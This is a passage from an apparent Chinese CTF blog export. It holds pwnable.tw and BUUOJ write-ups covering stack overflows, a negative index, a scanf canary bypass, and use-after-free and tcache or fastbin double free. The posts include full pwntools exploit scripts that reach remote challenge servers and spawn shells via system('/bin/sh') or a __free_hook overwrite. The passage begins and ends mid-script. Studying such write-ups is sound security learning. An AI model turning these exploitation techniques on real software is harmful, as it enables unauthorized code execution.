p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack+<span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Starbound</title>
    <url>/2024/07/26/Starbound/</url>
    <content><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>要利用<code>add    esp, 0x1c</code>，先把该指令的地址写到一个地址，如图是<code>0x80580d0</code>，同时也获得了<code>/home/starbound/flag</code>的地址，为<code>0x80580d4</code></p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246246.png" alt="1"></p>
<p>数组*dword_8058154[v3]*的首地址为<code>0x8058154</code>，如图</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246757.png" alt="2" style="zoom:67%;" />

<p>计算<code>0x80580d0</code>到<code>0x8058154</code>的偏移，为<code>0x84</code>，故索引为<code>-33</code>，即<code>doword_8058154[-33]</code>便是<code>0x80580d0</code>的地址。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246993.png" alt="3"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./starbound&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&quot;./starbound&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">payload1,payload2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>,payload1)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add    esp, 0x1c</span></span><br><span class="line"><span class="string">open(&quot;/home/starbound/flag&quot;,0)</span></span><br><span class="line"><span class="string">read(3,flag_addr,0x50)</span></span><br><span class="line"><span class="string">write(1,flag_addr,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add_esp_0x1c = <span class="number">0x08048e48</span></span><br><span class="line">file_addr = <span class="number">0x80580d4</span></span><br><span class="line">flag_addr = <span class="number">0x080580f0</span></span><br><span class="line">return_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = p32(add_esp_0x1c)+<span class="string">b&#x27;/home/starbound/flag\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;open&#x27;</span>])+p32(return_addr)+p32(file_addr)+p32(<span class="number">0</span>)</span><br><span class="line">fun(payload1,payload2)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])+p32(return_addr)+p32(<span class="number">3</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(return_addr)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246405.png" alt="4"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_1</title>
    <url>/2024/08/15/ciscn-2019-es-1/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<p>&#x3D;&#x3D;uaf&#x3D;&#x3D;，&#x3D;&#x3D;tcache的double free&#x3D;&#x3D;</p>
<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li>泄漏_libc_地址的一个方法：<code>unsortedbin</code>中的<code>main_arena</code>是一个_libc_地址，再利用<code>uaf</code>漏洞，可能可以泄漏_libc_地址。</li>
<li><code>unsortedbin_chunk</code>必须大于<code>0x400</code>。</li>
</ol>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>程序实现了_add_,<em>show</em>,<em>delete</em><code>3</code>个功能，有_uaf_漏洞。</p>
<h4 id="call"><a href="#call" class="headerlink" title="call"></a><em>call</em></h4><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252050534.png" alt="1"></p>
<p>_add_一次创建<code>2</code>个_chunk_，<code>0x20</code>_size_的_compary_chunk_，自定义_size_的_name_chunk_。<code>0ffset_0x4080</code>处存储着_compary_chunk_的地址，_compary_chunk_存储着_name_chunk_。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252050647.png" alt="2"></p>
<p><em>delete_一次，会_free_掉_name_chunk_，**而</em>*name_chunk_并未置零**，因此对_name_chunk_有_uaf_漏洞。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252049601.png" alt="3"  />

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h4 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏_libc_"></a>泄漏_libc_</h4><p>如果我们释放一个_name_chunk_到_unsortedbin_中，那么该_unsortedbin_chunk_的_fd_和_bk_都是一个_libc_地址。又因为_uaf_漏洞，我们_show_的时候，依然会输出上面_name_chunk_的_user_data_，故会打印出_libc_地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="覆盖-free-hook"><a href="#覆盖-free-hook" class="headerlink" title="覆盖___free_hook_"></a>覆盖___free_hook_</h4><p>有_uaf_漏洞，程序可以多次同一个_chunk_。<code>2.27</code>版本及以后的版本，_free_掉的_chunk_会被先放进_tcache_而非_fastbin_。_tcache_并无检查_double free_的机制，直接利用_double free_覆盖___free_hook_为_system_的地址即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p,elf,libc = load(&quot;a&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25834</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1668</span>,<span class="number">0x1674</span>,<span class="number">0x1680</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,compary</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">	p.sendafter(<span class="string">&quot;please input compary call:\n&quot;</span>,compary)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input the index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input the index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-dubblsort</title>
    <url>/2024/07/17/dubblsort/</url>
    <content><![CDATA[<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><p>对于<code>scanf(&quot;%u&quot;,v4)</code>，<code>%u</code>表示无符号整数</p>
<ul>
<li><p>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</p>
<span id="more"></span>
</li>
<li><p>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</p>
</li>
<li><p>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</p>
</li>
</ul>
<p>有些时候我们可以利用<em>scanf</em>的这个漏洞，达到绕过<em>canary</em>的目的。</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png" alt="1"></p>
<p>第一次<em>read</em>往<em>buf</em>写入<code>0x40</code>个字节，接着输入一个整数到<em>v8</em>，然后输入数据到栈中，这个过程循环<em>v8</em>次</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png" alt="2"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	在循环的过程中，每循环一次，往栈上输入数据的位置就<code>+1</code>，也就是说我们可以覆盖返回地址，但是同时也会覆盖<em>canary</em>。而我们又没办法泄漏<em>canary</em>，那能不能绕过修改<em>canary</em>的这一次循环呢？</p>
<p>对于<code>scanf(&quot;%u&quot;,v4)</code>，</p>
<ul>
<li>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</li>
<li>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
<li>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</li>
</ul>
<p>​	也就是说，假如<em>i&#x3D;11</em>时，我们该写入到<em>canary</em>这个位置，此时如果输入<code>+</code>，便能成功绕过<em>canary</em>。然后<em>i</em>也成功<code>+1</code>，接下来我们直接覆盖返回导致即可。</p>
<p>整体思路如下，</p>
<ol>
<li>计算偏移量，泄漏一个<em>libc</em>地址，算出<em>libc</em>基地址</li>
<li>绕过<em>canary</em>，覆盖返回地址</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line">debug(p)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_base = leak-<span class="number">0x1b000a</span>   <span class="comment">#本地的offset是0x1840a</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sort :&quot;</span>,<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png" alt="3"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>double free学习笔记</title>
    <url>/2024/07/10/double-free%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>_double free_其实就是_free_两次同一个_chunk_。</p>
<p>现在我们通过以下实验来了解_double free_</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk0,*chunk1;</span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行上面的代码，程序报了以下错误，这其实就是__int_free_函数检测到了_fastbin_的_double free_。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407142307675.png" alt="image-20240714230715552"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk0,*chunk1;</span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	而我们在两次_free_中间，_free_一次其他_chunk_，程序就不会报错了。因为_fastbin_在执行_free_的时候，只会检查_free_的是不是_main_arena_直接指向的_chunk_，如果是便会报错_double free_。</p>
<ul>
<li><p>当第一次_free(chunk0)_时，<code>main_arena -&gt; chunk0 -&gt; 0</code></p>
</li>
<li><p>_free(chunk1)_后，<code>main_arena -&gt; chunk1 -&gt; chunk0 -&gt; 0</code></p>
</li>
<li><p>再次_free(chunk0)_，<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407142325126.png" alt="image-20240714232555992"></p>
</li>
</ul>
<blockquote>
<p>2.通过fastbin double free后，我们实现了使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。如果更进一步修改fd指针，则能够实现任意地址分配堆块的效果，这就相当于任意地址写任意值的效果。</p>
<p>double free 是任意地址写的一种技巧，指堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，</p>
</blockquote>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>_Double Free_能够成功利用的条件：</p>
<ol>
<li>_fastbin_的堆块被释放后_next_chunk_的_pre_inuse_位不会被清空，表明该_chunk_还可以被_free_。因为有_uaf_漏洞，_chunk_被_free_后，指向该_free_的指针没有被置为<code>0</code>。（**<code>prev_inuse</code>**是一个标志位，用于指示前一个_chunk_是否已经被分配。如果_prev_inuse_为<code>1</code>，则表示前一个_chunk_已被分配；反之，则是空闲的。_prev_inuse_可能会被编码在_prev_size_的某个位上，如最低位。）</li>
<li>_fastbin_在执行_free_的时候，只会检查_free_的是不是_main_arena_直接指向的_chunk_，因此_main_arena_不能指向要_free_的_chunk_。</li>
</ol>
<h2 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a><em>gyctf_2020_some_thing_exceting</em></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>绕过检查，_double free_。</li>
<li>释放一个_chunk0_，并修改其_fd_指针为_fake_chunk_的_prev_size_地址。</li>
<li>释放_fake_chunk_，打印出_flag_。</li>
</ol>
<p>对_exp_的解释如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_chunk = <span class="number">0x602098</span>   <span class="comment">#flag的地址是0x6020a8,0x6020a0的值为0x60即size，故prev_size字段在0x602098</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#这里两个都要和后面再malloc的chunk的大小一样</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment">#main_arena指向了chunk1，故后面可以再次free(chunk0)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">8</span>)   <span class="comment">#fastbins中的chunk0被释放</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)   <span class="comment">#fastbins中的chunk1被释放</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)   <span class="comment">#因为fake_chunk的size为0x60，所以第一个大小为0x50。第二个大小0x60是由上一次malloc后的malloc_chunk的后面地址里的值决定的</span></span><br><span class="line">show(<span class="number">4</span>)   <span class="comment">#因为有uaf漏洞，所以free后指向这些chunk的指针并没有被置0，管理malloc_chunk的表中的chunk0,chunk2,chunk4都是一样的内容</span></span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27818</span>)</span><br><span class="line">debug(p,<span class="number">0x400EB6</span>,<span class="number">0x400ECE</span>,<span class="number">0x400EDA</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ba_size,ba_content,na_size,na_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; Now please tell me what you want to do :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; ba&#x27;s length : &quot;</span>,<span class="built_in">str</span>(ba_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; ba : &quot;</span>,ba_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; na&#x27;s length : &quot;</span>,<span class="built_in">str</span>(na_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; na : &quot;</span>,na_content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; Now please tell me what you want to do :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; Banana ID : &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; Now please tell me what you want to do :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; Banana ID : &gt; SCP project ID : &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x602098</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,<span 